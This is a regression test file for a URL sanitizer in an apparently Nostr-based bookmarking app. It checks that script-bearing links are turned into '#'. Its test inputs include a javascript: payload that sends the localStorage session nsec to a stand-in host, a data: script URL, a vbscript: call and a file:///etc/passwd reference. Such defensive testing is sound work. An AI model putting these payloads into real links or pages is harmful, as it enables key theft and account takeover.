// Regression: bookmark URLs from the API / search / public-cache paths were
// rendered as raw <a href> without a scheme check (only the relay-parse path
// enforced http(s)). A kind:39701 published straight to the relay with a
// `javascript:` d-tag could then run in our origin and read the localStorage
// nsec (account takeover). safeExternalHref neutralizes non-http(s) URLs at
// every render sink.

import { describe, expect, it } from 'vitest';
import { safeExternalHref } from '$lib/nostr/bookmarks.js';

describe('safeExternalHref', () => {
  it('passes through http(s) URLs unchanged', () => {
    expect(safeExternalHref('https://example.com/x?a=1#f')).toBe('https://example.com/x?a=1#f');
    expect(safeExternalHref('http://example.com')).toBe('http://example.com');
  });

  it('neutralizes script-bearing and non-http(s) schemes to "#"', () => {
    expect(safeExternalHref("javascript:fetch('//e/?k='+localStorage['deepmarks-session-nsec'])")).toBe('#');
    expect(safeExternalHref('JavaScript:alert(1)')).toBe('#');
    expect(safeExternalHref('data:text/html,<script>alert(1)</script>')).toBe('#');
    expect(safeExternalHref('vbscript:msgbox(1)')).toBe('#');
    expect(safeExternalHref('file:///etc/passwd')).toBe('#');
  });

  it('returns "#" for empty / malformed / relative input', () => {
    expect(safeExternalHref('')).toBe('#');
    expect(safeExternalHref(null)).toBe('#');
    expect(safeExternalHref(undefined)).toBe('#');
    expect(safeExternalHref('not a url')).toBe('#');
    expect(safeExternalHref('/relative/path')).toBe('#');
  });
});
